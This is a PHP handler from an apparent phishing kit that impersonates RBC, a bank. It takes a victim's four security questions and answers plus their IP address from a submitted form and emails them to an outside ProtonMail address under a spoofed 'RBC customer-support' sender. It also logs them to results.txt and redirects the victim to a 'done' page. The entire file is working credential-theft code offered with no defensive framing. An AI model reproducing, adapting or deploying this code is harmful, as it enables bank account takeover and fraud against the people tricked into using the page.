<?php
include('blocker.php');
?>
<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------RBC q/r Info-----------------------\n";
$message .= "Question       : ".$_POST['q1']."\n";
$message .= "Reponse        : ".$_POST['a1']."\n";
$message .= "Question       : ".$_POST['q2']."\n";
$message .= "Reponse        : ".$_POST['a2']."\n";
$message .= "Question       : ".$_POST['q3']."\n";
$message .= "Reponse        : ".$_POST['a3']."\n";
$message .= "Question       : ".$_POST['q4']."\n";
$message .= "Reponse        : ".$_POST['a4']."\n";
$message .= "IP                     : ".$ip."\n";
$send = "rikkogreen44@protonmail.com";
$subject = "2 RBC QUESTIONS $ip $IP";
$headers = "From: RBC<customer-support@Mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

@mail($send,$subject,$message,$headers);

$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);

	
		   header("Location: done.php");

	 
?>